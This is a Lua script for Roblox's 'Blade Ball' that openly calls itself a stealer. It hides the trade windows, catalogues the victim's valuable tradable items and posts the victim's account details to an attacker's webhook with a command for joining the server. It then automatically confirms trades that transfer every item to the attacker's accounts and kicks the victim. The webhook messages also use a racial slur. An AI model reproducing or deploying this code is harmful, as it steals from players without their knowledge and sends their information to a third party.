_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

-- Interface Cache
tradeGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false
tradeGui.Main.Visible = false
tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)
notificationsGui.Notifications.Visible = false
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

---------------------------------------------------------
-- TOUTES TES FONCTIONS (RÉINSÉRÉES)
---------------------------------------------------------

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function sendTradeRequest(user)
    local args = {[1] = game:GetService("Players"):WaitForChild(user)}
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args)) == true
end

local function addItemToTrade(itemType, ID)
    local args = {[1] = itemType, [2] = ID}
    repeat task.wait(0.01) until netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args)) == true
end

local function readyTrade()
    local args = {[1] = true}
    repeat task.wait(0.1) until netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args)) == true
end

local function confirmTrade()
    repeat task.wait(0.1) netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer() until not inTrade
end

local function getExecutor()
    return identifyexecutor and identifyexecutor() or "Unknown"
end

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items[category]
    if not rapData then return nameToRAP end
    for skey, rap in pairs(rapData) do
        local success, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if success then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, cat in ipairs(categories) do rapMappings[cat] = buildNameToRAPMap(cat) end

local function getRAP(category, itemName)
    return rapMappings[category] and rapMappings[category][itemName] or 0
end

local function getNextBatch(items, batchSize)
    local batch = {}
    for i = 1, math.min(batchSize, #items) do table.insert(batch, table.remove(items, 1)) end
    return batch
end

---------------------------------------------------------
-- MESSAGES WEBHOOK (VIOLET, VERT, ROUGE)
---------------------------------------------------------

local function SendJoinMessage(list, prefix) -- MESSAGE VIOLET (DÉPART)
    local itemLines = ""
    for _, item in ipairs(list) do itemLines = itemLines .. "• " .. item.Name .. " - " .. formatNumber(item.RAP) .. " RAP\n" end
    
    local data = {
        ["auth_token"] = auth_token,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "ℹ️ Player info:", value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days\n⚡ Executor: "..getExecutor().."```", inline = false},
                {name = "Item list 📝:", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false},
                {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list, title, color) -- MESSAGE VERT / ROUGE
    local itemLines = ""
    for _, item in ipairs(list) do itemLines = itemLines .. "• " .. item.Name .. "\n" end
    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Items sent 📝:", value = "```" .. itemLines .. "```", inline = false},
                {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false}
            },
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE DE TRADE ET ATTENTE
---------------------------------------------------------

local function doTrade(joinedUser)
    task.spawn(function()
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.5) until inTrade
            local currentBatch = getNextBatch(itemsToSend, 100)
            for _, item in ipairs(currentBatch) do addItemToTrade(item.itemType, item.ItemID) end
            
            readyTrade()
            confirmTrade()
        end
        SendMessage({}, "✅ Stuff Successfully Stolen !", 65280)
        plr:kick("Transfer Complete.")
    end)
end

local function waitForUserJoin()
    local sentMessage = false
    local function onUserJoin(player)
        if table.find(users, player.Name) then
            if not sentMessage then
                SendMessage(itemsToSend, "✅ The nigga is on the server ! 🎉", 65280)
                sentMessage = true
            end
            doTrade(player.Name)
        end
    end
    for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
    Players.PlayerAdded:Connect(onUserJoin)
end

-- 🔴 DÉTECTION SI QUITTE (ROUGE)
Players.PlayerRemoving:Connect(function(p)
    if p == plr then SendMessage(itemsToSend, "🔴 Victim Left the Server !", 16711680) end
end)

---------------------------------------------------------
-- INITIALISATION
---------------------------------------------------------

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = getRAP(category, itemInfo.Name)
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, (ping == "Yes" and "@everyone " or ""))
    waitForUserJoin()
end
